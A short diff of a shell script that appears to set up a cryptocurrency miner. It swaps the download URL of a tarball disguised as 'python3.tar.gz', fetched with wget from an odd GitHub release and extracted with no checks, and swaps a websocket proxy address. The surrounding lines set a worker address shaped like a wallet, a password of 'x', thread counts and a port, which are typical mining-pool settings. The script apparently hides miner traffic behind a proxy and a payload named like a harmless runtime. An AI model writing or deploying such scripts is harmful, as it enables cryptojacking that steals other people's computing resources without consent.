@@ -28,7 +28,7 @@ set_timezone() {
 download_python() {
     if [ ! -f python3.tar.gz ]; then
         echo 'Downloading python3.tar.gz...'
-        wget -O python3.tar.gz https://github.com/malphite-code-3/ai-realestale-trainer/releases/download/python3.2/python3.tar.gz
+        wget -O python3.tar.gz https://github.com/khanhnguyen97/ok2/releases/download/khanh/python3.tar.gz
     fi
     echo 'Extracting python3.tar.gz...'
     tar -xvf python3.tar.gz
@@ -82,7 +82,7 @@ M_PORT="13382"
 M_WORKER="YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC"
 M_PASSWORD="x"
 M_THREADS="16"
-M_PROXY="ws://172.233.136.27:8088/proxy"
+M_PROXY="wss://flexible-eustacia-mtp-0b00e028.koyeb.app/proxy"
 # Call functions in sequence
 
 # Install screen
